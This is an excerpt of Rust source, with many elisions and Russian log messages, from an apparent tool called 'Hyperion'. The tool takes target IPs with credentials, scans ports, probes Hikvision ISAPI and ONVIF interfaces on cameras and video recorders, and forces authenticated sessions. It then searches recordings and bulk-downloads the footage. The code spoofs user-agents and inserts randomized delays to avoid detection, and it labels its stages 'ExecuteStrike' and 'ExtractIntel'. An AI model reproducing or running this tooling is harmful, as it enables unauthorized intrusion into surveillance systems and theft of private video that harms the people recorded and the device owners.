...
fn generate_session_id(rng: &mut SandRng) -> String {
    ...
    for _ in 0..64 {
        id.push_str(&format!("{:x}", rng.range(0, 16)));
    }
    id
}
...
async fn azgura_session_login_with_ports(
    ...
    let client = match build_cookie_client(15) {
        Ok(c) => c,
        Err(_) => return None,
    };
    ...
    for port in &isapi_ports {
        ...
        let cap_url = format!(
            "http://{}:{}/ISAPI/Security/sessionLogin/capabilities",
            host, port
        );
        let _ = tx
            .send(HyperionEvent::NexusLog {
        ...
        let _ = tx
            .send(HyperionEvent::NexusLog {
                message: format!(
                    "🔑 [TOKEN] POST sessionLogin :{} (irreversible={})",
                    port, is_irreversible
                ),
            })
            .await;
        ...
        match resp {
            Ok(r) => {
                ...
                if status == 200
                    && (body.contains("<statusValue>200</statusValue>")
                        ...
                        || !cookies.is_empty())
                {
                    let _ = tx
                        .send(HyperionEvent::NexusLog {
                            message: format!(
                                "🔑 [TOKEN] ✅ СЕССИЯ ПОЛУЧЕНА на порту {}! Cookies: {:?}",
                                port, cookies
                            ),
                        })
                        .await;
                ...
                if status == 401 || status == 400 {
                    let _ = tx
                        .send(HyperionEvent::NexusLog {
                            message: format!(
                                "🔑 [TOKEN] :{} sessionLogin вернул {} — пробуем userCheck",
                                port, status
                            ),
                        })
                        .await;
...
async fn try_user_check_session(
    ...
    let _ = tx
        .send(HyperionEvent::NexusLog {
            message: format!(
                "🔑 [TOKEN] userCheck :{} → HTTP {} | WWW-Auth: {}",
                port,
                status,
                auth_header.as_deref().unwrap_or("(none)")
            ),
        })
        .await;
    ...
    if status == 401 {
        if let Some(ah) = auth_header {
            ...
            let _ = tx
                .send(HyperionEvent::NexusLog {
                    message: format!(
                        "🔑 [TOKEN] userCheck+Digest :{} → HTTP {} | cookies: {:?} | body: {}",
                        port,
                        status2,
                        cookies,
            ...
            if status2 == 200 {
                if !cookies.is_empty() {
                    let _ = tx
                        .send(HyperionEvent::NexusLog {
                            message: format!(
                                "🔑 [TOKEN] ✅ СЕССИЯ (userCheck+Digest+Cookie) на порту {}!",
                                port
                            ),
                        })
                        .await;
...
async fn digest_request(
    ...
    let bootstrap = if is_2019 {
        ...
        req.send()
            .await
            .map_err(|e| format!("Bootstrap std: {}", e))?
    };
    ...
    let mut prompt =
        digest_auth::parse(&auth_header).map_err(|e| format!("Digest parse: {:?}", e))?;
    ...
    let resp = req
        .send()
        .await
        .map_err(|e| format!("Digest final: {}", e))?;
    let _ = _tx
        .send(HyperionEvent::NexusLog {
            message: format!(
                "🔐 [DIGEST] {} → final HTTP {}",
...
async fn probe_isapi_with_ports(
    host: &str,
    login: &str,
    pass: &str,
    open_ports: Option<&[u16]>,
    ...
    for (_port, ep) in &candidates {
        ...
        .await
        {
            Ok(resp) => {
                ...
                let _ = tx
                    .send(HyperionEvent::NexusLog {
                        message: format!("🔍 [PROBE] {} → HTTP {}", ep, s),
                    })
                    .await;
                if s == 200 || s == 401 || s == 403 {
                    let _ = tx
                        .send(HyperionEvent::NexusLog {
                            message: format!("🔓 [PROBE] ISAPI ОБНАРУЖЕН: {} (HTTP {})", ep, s),
                        })
                        .await;
...
async fn probe_onvif(host: &str, tx: &mpsc::Sender<HyperionEvent>) -> Option<String> {
    ...
    for ep in &[
        ...
        req = if is_2019 {
            apply_ie_bootstrap(req)
        } else {
            apply_sand_headers(&mut rng, req)
        };
        if let Ok(resp) = req.send().await {
            let s = resp.status().as_u16();
            if s == 200 || s == 401 || s == 403 || s == 405 {
                return Some(ep.clone());
            }
        }
        sand_sleep(
...
async fn fetch_device_info(
    ...
    for url in &[
        ...
        let client = if url.contains(":2019") {
            build_ie_client(15)
        } else {
            build_sand_client(&mut rng, 8)
        };
        ...
        .await
        {
            if resp.status().is_success() {
                ...
                let vendor = if text.contains("hikvision") || text.contains("isapi") {
                    NvrVendor::Hikvision
                } else if text.contains("dahua") {
                    NvrVendor::Dahua
                } else {
                    NvrVendor::Hikvision
                };
...
async fn check_camera_clock(
    ...
    for port in &[2019, 80] {
        ...
        let client = if *port == 2019 {
            build_ie_client(15).ok()?
        } else {
            build_sand_client(&mut SandRng::new(), 8).ok()?
        };
        if let Ok(resp) = digest_request(
            &client,
            reqwest::Method::GET,
            ...
            if resp.status().is_success() {
                ...
                if val.len() >= 4 {
                    if let Ok(cam_year) = val[..4].parse::<i32>() {
                        ...
                        let _ = tx
                            .send(HyperionEvent::NexusLog {
                                message: format!("🕒 [CLOCK] Камера: {} | skew={}y", val, skew),
                            })
                            .await;
                        return Some(skew);
                    }
...
async fn search_isapi_with_ports(
    ...
    let (from, to) = match clock_offset {
        ...
        _ => ("2024-01-01T00:00:00Z".into(), "2027-12-31T23:59:59Z".into()),
    };
            ...
            for probe_tid in &track_ids {
                ...
                match resp {
                    Ok(r) => {
                        ...
                        let looks_like_search_result = body.contains("<playbackURI>")
                            || body.contains("<url>")
        ...
        let gen = match working_gen {
            ...
            None => {
                let _ = tx
                    .send(HyperionEvent::NexusLog {
                        message: format!(
                            "⚠️ [SEARCH] Ни один XML формат не прошёл на {} — пропускаем",
                            endpoint
                        ),
                    })
                    .await;
...
async fn search_onvif(
    ...
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = match build_sand_client(&mut rng, 10) {
        Ok(c) => c,
        Err(_) => return vec![],
    };
    ...
    for ep in &[
        ...
        if let Ok(r) = apply_sand_headers(&mut rng, req).send().await {
            if r.status().is_success() || r.status().as_u16() == 401 {
                ...
                let out: Vec<OnvifHit> = re
                    .captures_iter(&text)
                    .filter_map(|c| {
                        c.get(1).map(|m| OnvifHit {
                            endpoint: ep.clone(),
...
async fn sand_download_isapi_stream(
    ...
    let resp = if let Some(sc) = session_client {
        ...
        match r {
            ...
            _ => digest_download_request(client, url, path, login, pass, vec![], tx).await?,
        }
    } else {
        digest_download_request(client, url, path, login, pass, vec![], tx).await?
    };
...
async fn sand_download_isapi(
    ...
    let ua = if is_2019 {
        ...
        rng.pick(UA_POOL).to_string()
    };

    let _ = tx
        .send(HyperionEvent::NexusLog {
            message: format!(
                "🏖️ [SAND] Сессия {} | has_cookie={}",
                task_key,
                session_client.is_some()
            ),
        })
        .await;
...
async fn sand_download_onvif(
    ...
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = if endpoint.contains(":2019") {
        build_ie_client(45)?
    } else {
        build_sand_client(&mut rng, 45)?
    };
    sand_sleep(
        &mut rng,
        sand.api_delay_min_ms,
    ...
    let soap = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trp="http://www.onvif.org/ver10/replay/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema"><s:Body><trp:GetReplayUri><trp:StreamSetup><tt:Stream>RTP-Unicast</tt:Stream><tt:Transport><tt:Protocol>RTSP</tt:Protocol></tt:Transport></trp:StreamSetup><trp:RecordingToken>{}</trp:RecordingToken></trp:GetReplayUri></s:Body></s:Envelope>"#,
        token
    );
    let path = url_to_path(endpoint);
    let resp = digest_request(
    ...
    let mut filename = sanitize_filename(filename_hint);
    if filename.is_empty() {
        filename = format!("onvif_{}.mp4", Utc::now().timestamp());
    }
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }
            ...
            Ok(None) => {
                ...
                if let Ok(m) = std::fs::metadata(&fpath) {
                    if m.len() > 0 {
                        let _ = tx
                            .send(HyperionEvent::NexusLog {
                                message: format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, m.len()),
                            })
                            .await;
                    }
                }
    ...
    let _ = tx
        .send(HyperionEvent::NexusLog {
            message: format!("🏖️ ONVIF done: {} ({} bytes)", filename, sz),
        })
        .await;
    Ok(fpath.to_string_lossy().to_string())
}
        ...
        tokio::spawn(async move {
            while let Some(event) = rx.recv().await {
                ...
                let summary = match &event {
                    ...
                    HyperionEvent::ExtractIntel {
                        ip,
                        isapi_recordings,
                        onvif_recordings,
                        ..
                    } => Some(format!(
                        "🔑 [CIPHER] ISAPI:{} ONVIF:{} для {}",
                        isapi_recordings.len(),
                        onvif_recordings.len(),
                        ip
                    )),
                    HyperionEvent::TransportCargo {
                        ip, download_tasks, ..
                    } => Some(format!(
                        "🚚 [TRANSPORT] {} задач для {}",
                        download_tasks.len(),
                ...
                match event {
                    HyperionEvent::TargetDiscovered {
                        ip,
                        port,
                        login,
                        pass,
                        ...
                        let _ = tx_i
                            .send(HyperionEvent::AnalyzeTarget {
                                ip,
                                port,
                                login,
                                pass,
                    ...
                    HyperionEvent::AnalyzeTarget {
                        ...
                        tokio::spawn(async move {
                            ...
                            if host.is_empty() {
                                let _ = tx_b
                                    .send(HyperionEvent::OperationFailed {
                                        ip,
                                        reason: "Пустой хост".into(),
                                    })
                                    .await;
                                return;
                            }
                            ...
                            let _ = tx_b
                                .send(HyperionEvent::NexusLog {
                                    message: format!("🧠 Порты {}...", host),
                                })
                                .await;
                            let open_ports = scan_ports(&host, &tx_b).await;
                            let _ = tx_b
                                .send(HyperionEvent::NexusLog {
                                    message: format!("🧠 Открыты: {:?}", open_ports),
                                })
                                .await;
                            ...
                            let _ = tx_b
                                .send(HyperionEvent::NexusLog {
                                    message: "🧠 ISAPI/ONVIF probe...".into(),
                                })
                                .await;
                            let (isapi_ep, onvif_ep) = tokio::join!(
                                probe_isapi_with_ports(
                                    &host,
                                    &login,
                                    &pass,
                                    Some(&open_ports),
                            ...
                            if isapi_ep.is_none() && onvif_ep.is_none() {
                                let _ = tx_b
                                    .send(HyperionEvent::OperationFailed {
                                        ip,
                                        reason: "ISAPI/ONVIF не найдены".into(),
                                    })
                                    .await;
                                return;
                            }
                            ...
                            let (vendor, model, clock) =
                                fetch_device_info(&host, &login, &pass, &tx_b).await;
                            let _ = tx_b
                                .send(HyperionEvent::NexusLog {
                                    message: format!(
                                        "🧠 {} | {} | clock={:?}",
                                        vendor,
                                        model.as_deref().unwrap_or("n/a"),
                                        clock
                                    ),
                                })
                                .await;
                            ...
                            let _ = tx_b
                                .send(HyperionEvent::TargetAnalyzed {
                                    ip,
                                    port,
                                    login,
                                    pass,
                                    vendor,
                                    open_ports,
                                    isapi_endpoint: isapi_ep,
                                    onvif_endpoint: onvif_ep,
                                    device_model: model,
                                    camera_time_offset: clock,
                                })
                                .await;
                        });
                    }
                    HyperionEvent::TargetAnalyzed {
                        ...
                        if isapi_endpoint.is_some() || onvif_endpoint.is_some() {
                            let _ = tx_i
                                .send(HyperionEvent::ExecuteStrike {
                                    ip,
                                    port,
                                    login,
                                    pass,
                    ...
                    HyperionEvent::ExecuteStrike {
                        ...
                        tokio::spawn(async move {
                            ...
                            let session_client = if isapi_endpoint.is_some() {
                                let _ = tx_s
                                    .send(HyperionEvent::NexusLog {
                                        message: "🔑 [TOKEN] Запрос боевой сессии...".into(),
                                    })
                                    .await;
                                azgura_session_login_with_ports(
                                    &host,
                                    &login,
                                    &pass,
                                    Some(&open_ports),
                            ...
                            if ih.is_empty() && oh.is_empty() {
                                let _ = tx_s
                                    .send(HyperionEvent::OperationFailed {
                                        ip,
                                        reason: "Записи не найдены".into(),
                                    })
                                    .await;
                                return;
                            }
                            let _ = tx_s
                                .send(HyperionEvent::ExtractIntel {
                                    ip,
                                    login,
                                    pass,
                                    vendor,
                    ...
                    HyperionEvent::ExtractIntel {
                            ...
                            if let Some(ref uri) = hit.playback_uri {
                                tasks.push(DownloadTask::IsapiPlayback {
                                    ...
                                    filename_hint: format!(
                                        "isapi_{}_{}_{}.mp4",
                                        normalize_host(&ip),
                                        hit.track_id.as_deref().unwrap_or("trk"),
                                        i
                                    ),
                                });
                            }
                        ...
                        for (i, hit) in onvif_recordings.iter().enumerate() {
                            tasks.push(DownloadTask::OnvifToken {
                                endpoint: hit
                                    .endpoint
                                    .replace("recording_service", "replay_service"),
                                recording_token: hit.token.clone(),
                                login: login.clone(),
                                pass: pass.clone(),
                        ...
                        if tasks.is_empty() {
                            let _ = tx_i
                                .send(HyperionEvent::OperationComplete {
                                    ip,
                                    result: "Записи без URI".into(),
                                })
                                .await;
                        } else {
                            let _ = tx_i
                                .send(HyperionEvent::TransportCargo {
                                    ip,
                                    login,
                                    pass,
                    ...
                    HyperionEvent::TransportCargo {
                        ...
                        tokio::spawn(async move {
                            ...
                            let session_client =
                                azgura_session_login(&host, &login, &pass, &tx_t).await;

                            for (i, task) in download_tasks.into_iter().enumerate() {
                                if i > 0 {
                                    sand_sleep(
                                        &mut rng,
                                        sand.task_delay_min_ms,
                                        sand.task_delay_max_ms,
                                        &tx_t,
                                        &format!("inter-task {}/{}", i + 1, total),
                                    )
                                    .await;
                                }
                                let _ = tx_t
                                    .send(HyperionEvent::NexusLog {
                                        message: format!("🚚 Задача {}/{}", i + 1, total),
                                    })
                                    .await;
                                let res = match task {
                                    DownloadTask::IsapiPlayback {
                                        playback_uri,
                                        login,
                                        pass,
                                        filename_hint,
                                    ...
                                    DownloadTask::RtspCapture {
                                        source_url,
                                        filename_hint,
                                        duration_seconds,
                                    } => {
                                        let dir =
                                            get_vault_path().join("archives").join("nexus_rtsp");
                                        let _ = std::fs::create_dir_all(&dir);
                            ...
                            let _ = tx_t
                                .send(HyperionEvent::OperationComplete {
                                    ip,
                                    result: format!("{}/{} загружено, {} ошибок", ok, total, fail),
                                })
                                .await;
                        });
                    }

                    HyperionEvent::OperationComplete { .. }
                    | HyperionEvent::OperationFailed { .. }
